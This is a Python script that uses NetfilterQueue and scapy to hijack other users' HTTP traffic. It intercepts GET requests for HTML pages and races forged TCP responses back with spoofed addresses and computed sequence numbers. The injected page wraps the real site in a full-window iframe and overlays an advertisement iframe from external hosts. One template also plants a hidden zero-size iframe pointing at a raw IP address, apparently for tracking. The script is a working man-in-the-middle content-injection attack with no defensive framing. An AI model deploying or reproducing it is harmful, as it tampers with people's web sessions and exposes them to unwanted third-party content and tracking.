from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.layers import http

http_rsp = r'''
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Connection: close
Expires: 0
Cache-control: no-store,no-cache,must-revalidate,post-check=0,pre-check=0
Content-Length:1203

<!DOCTYPE HTML><html><head><title></title><script>d=document;function u(){var f = d.location.href;d.getElementById("m").src=f+(f.indexOf("&")<0?'?':'&')+'_t=t';}setTimeout(function(){d.getElementById("x").style.display='block';}, 2000);function c(){x.style.display="none"}</script><style>body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}#x{position:absolute;z-index:2;right:18px;bottom:0px;width:400px;height:300px}#i{display:block; position:absolute; z-index:1; width:100%; height:100%}</style></head><body onLoad=u()><div id=i><iframe id=m frameborder=0 width=100% height=100%></iframe></div><div id=x><a onClick=c()>X</a><iframe src=http://cdn.shdsp.net/zd/js_02.html width=400 height=300 scrolling=no frameborder=0></iframe></div><script>var s=new Date().getTime();var n=Math.random();d.write("<iframe frameborder=\"0\" src=\"http://221.231.148.199/1.htm?k=$1610769463$0$0$"+s+"$"+n+"$0\" width=\"0\" height=\"0\" scrolling=\"no\"></iframe>");</script></body></html>
'''


http_rsp2 = r'''
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Connection: close
Expires: 0
Cache-control: no-store,no-cache,must-revalidate,post-check=0,pre-check=0
Content-Length:1025

<!DOCTYPE HTML><html><head><title></title><script>d=document;function u(){var f = d.location.href;d.getElementById("m").src=f+(f.indexOf("&")<0?'?':'&')+'_t=t';}setTimeout(function(){d.getElementById("x").style.display='block';}, 2000);function c(){x.style.display="none"}</script><style>body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}#x{position:absolute;z-index:2;right:18px;bottom:0px;width:400px;height:300px}#i{display:block; position:absolute; z-index:1; width:100%; height:100%}</style></head><body onLoad=u()><div id=i><iframe id=m frameborder=0 width=100% height=100%></iframe></div><div id=x><a onClick=c()>X</a><iframe src=http://cdn.937791.com/tdyx/18974sp_yxhg-lyhyjxf/file/k300g250.swf?_=1444111486 width=400 height=300 scrolling=no frameborder=0></iframe></div></body></html>
'''

http_rsp3 = r'''
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Connection: close
Expires: 0
Cache-control: no-store,no-cache,must-revalidate,post-check=0,pre-check=0
Content-Length:1004

<!DOCTYPE HTML><html><head><title></title><script>d=document;function u(){var f = d.location.href;d.getElementById("m").src=f+(f.indexOf("&")<0?'?':'&')+'_t=t';}setTimeout(function(){d.getElementById("x").style.display='block';}, 2000);function c(){x.style.display="none"}</script><style>body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}#x{position:absolute;z-index:2;right:18px;bottom:0px;width:400px;height:300px}#i{display:block; position:absolute; z-index:1; width:100%; height:100%}</style></head><body onLoad=u()><div id=i><iframe id=m frameborder=0 width=100% height=100%></iframe></div><div id=x><a onClick=c()>X</a><iframe src=http://www.weafee.net/template/images/logo-zh-small-2.png width=400 height=300 scrolling=no frameborder=0></iframe></div></body></html>
'''


def print_and_drop(pkt):
    if pkt.get_payload_len() > 80:
        ip_layer = ''.join(map(lambda x:hex(ord(x))[2:].zfill(2), pkt.get_payload()))
        x = IP(ip_layer.decode('hex'))
#        x.show()
    
        if hasattr(x, 'Method') and x.Method == 'GET' and x.Path.find('_t=t') == -1 and hasattr(x, 'Accept') and x.Accept is not None and x.Accept.lower().find('html')!= -1:
            send(IP(src=x.getlayer('IP').dst, dst=x.getlayer('IP').src,ttl=127, flags=2)/TCP(dport=x.sport, sport=x.dport, seq = x.ack, ack=x.seq+x.len-x.ihl*4-x.dataofs*4, flags=0x011)/http_rsp3)



    pkt.drop()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_drop)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print
